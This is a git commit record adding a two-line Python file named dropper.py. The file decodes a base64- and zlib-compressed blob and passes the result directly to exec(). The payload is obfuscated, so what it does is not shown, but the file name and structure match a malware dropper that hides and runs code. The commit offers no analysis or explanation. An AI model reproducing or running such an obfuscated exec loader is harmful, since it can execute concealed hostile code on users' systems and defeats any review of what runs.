c7a583f58ee4dbf819e3979080f6aadf282bcb4b
pyscripter99 <78647110+pyscripter99@users.noreply.github.com>
2022-06-28 09:43:08 +1000

    Add files via upload

---
+++ dropper.py
@@ -0,0 +1,2 @@
+import zlib,base64
+exec(zlib.decompress(base64.b64decode("eJzFjz9PwzAQxfd8CstTIqW2VKZW6sDIAANCYqiqKCTX1Cj+w/mslm9fu46hGyM32e9+d++d0s4isRORU7dnyxC+AnjyLfv01lSDNUc1dQFntmM8gX4rJfZnMSk6hY/gASNDYEgMVkv37QdUjgA3G/lsxzCDXx0trt6fXl4f36TulZE66yI58GJBcKHoUfzFBFT/ujci9Rc2YmlUzLYffX0331TnmOruniVlh+DsAu55tu/ylx/2fIHSLabXwA8t+4tNCxOX+zs+onUO8IE324rF+ucc65IjVY7ASutHL4LAYOrmCqctvI0=".encode())).decode())
